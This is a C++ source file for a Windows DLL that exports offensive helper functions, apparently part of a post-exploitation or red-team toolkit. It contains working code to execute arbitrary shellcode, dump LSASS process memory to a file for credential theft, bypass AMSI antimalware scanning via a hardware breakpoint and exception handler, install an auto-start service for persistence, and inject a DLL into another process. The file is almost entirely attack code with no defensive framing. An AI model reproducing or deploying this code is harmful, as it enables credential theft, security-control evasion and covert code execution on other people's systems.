#include "pch.h"


extern "C" __declspec(dllexport)
int* getResolution()
{
    int* res = new int[2];
    DEVMODE devMode =  DEVMODE();
    EnumDisplaySettings(NULL, -1, &devMode);
    res[0] = devMode.dmPelsWidth;
    res[1] = devMode.dmPelsHeight;
    return res;
}

extern "C" __declspec(dllexport)
int runShellCode(const char* shellCode, int shellCodeSize)
{
    void* exec = VirtualAlloc(0, shellCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
    {
        return -2; 
    }
    memcpy(exec, shellCode, shellCodeSize);
    if (memcmp(exec, shellCode, shellCodeSize) != 0)
    {
        VirtualFree(exec, 0, MEM_RELEASE);
        return -3;
    }
    ((void(*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);
    return 0; 
}

extern "C" __declspec(dllexport)
int CreateNewProcess(const wchar_t* appname, wchar_t cmdline[])
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    wchar_t* newCmdline;

    if (cmdline[0] != L' ') {
        size_t len = wcslen(cmdline);

        newCmdline = new wchar_t[len + 2];
        newCmdline[0] = L' ';
        wcsncpy_s(newCmdline + 1, len + 1, cmdline, len + 1);
    }

    else {
        newCmdline = cmdline;
    }

    if (!CreateProcess(appname,
        newCmdline,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi)
        )
    {
        return -1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}


extern "C" __declspec(dllexport)
int LSASSDump()
{
    HANDLE lsassProcess;
    int lsassPID = 668;
    HANDLE DumpFile = CreateFileA("dumpfile.dmp", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!DumpFile) {
        return 1;
    }

    lsassProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, lsassPID);
    if (!lsassProcess) {
        return 1;

    }

    BOOL ProcDump = MiniDumpWriteDump(lsassProcess, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (!ProcDump) {
        return 1;
    }
    return 0;
}






HMODULE hLib;
FARPROC pAmsiScanBuffer;
LONG CALLBACK VectoredHandler(
    _In_ PEXCEPTION_POINTERS ExceptionInfo
) {
    hLib = LoadLibrary(L"amsi.dll");
    pAmsiScanBuffer = GetProcAddress(hLib, "AmsiScanBuffer");
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == pAmsiScanBuffer) {
            ULONG_PTR* rsp = (ULONG_PTR*)ExceptionInfo->ContextRecord->Rsp;
            ULONG_PTR* ScanResult = (ULONG_PTR*)(rsp[6]);

            *ScanResult = 0;

            ExceptionInfo->ContextRecord->Rip = rsp[0];
            ExceptionInfo->ContextRecord->Rsp += 8;
            ExceptionInfo->ContextRecord->Rax = 0;

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


extern "C" __declspec(dllexport)
int AmsiBypass() {
    if (AddVectoredExceptionHandler(1, VectoredHandler) == NULL) {
        return 1;
    }

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
        return 2;
    }

    ctx.Dr0 = (DWORD64)pAmsiScanBuffer;
    ctx.Dr7 |= 1 << 0;

    if (!SetThreadContext(GetCurrentThread(), &ctx)) {
        return 3;
    }

    return 0;
}


extern "C" __declspec(dllexport)
int createSrv(const wchar_t* appname, const wchar_t* srvname, const wchar_t* desc) {
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scmHandle) {
        printf("OpenSCManager failed with error: %d\n", GetLastError());
        return 1;
    }

    SC_HANDLE serviceHandle = CreateService(
        scmHandle,
        srvname,
        desc,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        appname,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (!serviceHandle) {
        printf("CreateService failed with error: %d\n", GetLastError());
        CloseServiceHandle(scmHandle);
        return 2;
    }

    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    return 0;
}


extern "C" __declspec(dllexport)
int InjectDll(int targetId, LPCSTR dllLibFullPath) {
    char fullDllPath[256];
    if (!GetFullPathNameA(dllLibFullPath, sizeof(fullDllPath), fullDllPath, NULL)) {
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetId);
    if (hProcess == NULL) {
        return 2;
    }

    LPVOID pDllAlloce = VirtualAllocEx(hProcess, NULL, strlen(fullDllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pDllAlloce == NULL) {
        return 3;
    }

    if (!WriteProcessMemory(hProcess, pDllAlloce, fullDllPath, strlen(fullDllPath) + 1, NULL)) {
        return 4;
    }

    LPTHREAD_START_ROUTINE loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    HANDLE hrThread = CreateRemoteThread(hProcess, NULL, 0, loadLibrary, pDllAlloce, 0, NULL);
    if (hrThread == NULL) {
        return 5;
    }

    return 0;
}


extern "C" __declspec(dllexport)
bool isx64Exe(LPCSTR path) {
    DWORD type;
    bool result;
    if (GetBinaryTypeA(path, &type)) {
        return type == SCS_64BIT_BINARY;
    }
    return FALSE;
}